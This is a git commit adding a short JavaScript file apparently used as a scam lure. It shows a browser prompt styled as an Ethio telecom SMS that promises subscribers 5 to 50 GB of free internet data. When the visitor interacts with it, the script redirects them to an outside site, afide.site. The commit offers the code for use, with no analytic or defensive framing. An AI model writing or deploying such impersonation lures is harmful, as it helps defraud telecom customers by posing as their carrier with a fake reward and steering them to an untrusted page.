54d0f1a1bb7e2de48830088e609264df6838d773
ufaiba <ufaiba247@gmail.com>
2026-06-25 01:09:50 -0700

    Create act-ethiotelecomsubscribers.js

---
+++ act-ethiotelecomsubscribers.js
@@ -0,0 +1,5 @@
+var password = 'ነፃ ዳታ'
+password=prompt('Ethio telecom SMS: ውድ ደንበኛችን የረጅም ጊዜ ተመዝጋቢዎቻችን ፣የደንበኞች ሽልማት በመሆናችን ከ5ጂቢ እስከ 50ጂቢ ነፃ የኢንተርኔት ዳታ ይቀበሉ ፣አሁን ለማየት ነፃ ዳታ ይጫኑ ','ነፃ ዳታ');
+if (password != 'ነፃ ዳታ') {
+location.href='https://afide.site/ethiotelecomsubscribers.html';
+}
